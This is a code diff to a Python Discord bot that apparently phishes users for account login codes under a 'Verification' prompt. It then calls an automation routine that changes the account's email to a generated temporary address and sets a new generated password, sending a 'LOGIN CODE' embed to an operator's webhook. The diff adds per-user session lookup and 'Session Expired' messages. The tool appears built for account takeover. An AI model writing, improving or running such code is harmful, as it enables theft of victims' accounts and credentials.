@@ -33,11 +33,24 @@ class MyModalTwo(ui.Modal, title="Verification"):
         if data.get("webhook") is None:
             await interaction.response.send_message("The webhook has not been set yet", ephemeral=True)
         else:
+            from views.otp import get_user_session
+            user_session = get_user_session(interaction.user.id)
+            if user_session is None:
+                await interaction.response.send_message(
+                    embed=discord.Embed(
+                        title="Session Expired",
+                        description="Session has expired! try again",
+                        colour=0xFF0000
+                    ),
+                    ephemeral=True
+                )
+                return
+
             async with aiohttp.ClientSession() as session:
                 newgenpassword = generate_password()
                 TempEmail = await CreateRandomEmail()
                 webhook = Webhook.from_url(data["webhook"], session=session)
-                email = config.LastUsedEmail
+                email = user_session.get("email") or config.LastUsedEmail
                 try:
                     Codeembed=discord.Embed(
                             title="LOGIN CODE",
@@ -68,11 +81,22 @@ class MyModalTwo(ui.Modal, title="Verification"):
             )
             async with aiohttp.ClientSession() as session:
                 starttime = time.time()
-                await automate_auto_change(email,self.box_three.value,TempEmail,newgenpassword)
+                result = await automate_auto_change(email, self.box_three.value, TempEmail, newgenpassword, interaction.user.id)
                 endtime = time.time()
                 timetotal = endtime - starttime
                 webhook = Webhook.from_url(data["webhook"], session=session)
-                
+
+                if result == "expired":
+                    await interaction.followup.send(
+                        embed=discord.Embed(
+                            title="Session Expired",
+                            description="Session has expired! try again",
+                            colour=0xFF0000
+                        ),
+                        ephemeral=True
+                    )
+                    return
+
                 # NEW CODE: Check if incorrect code was detected
                 if hasattr(config, 'INCORRECT_CODE') and config.INCORRECT_CODE:
                     embed_incorrect_code = discord.Embed(
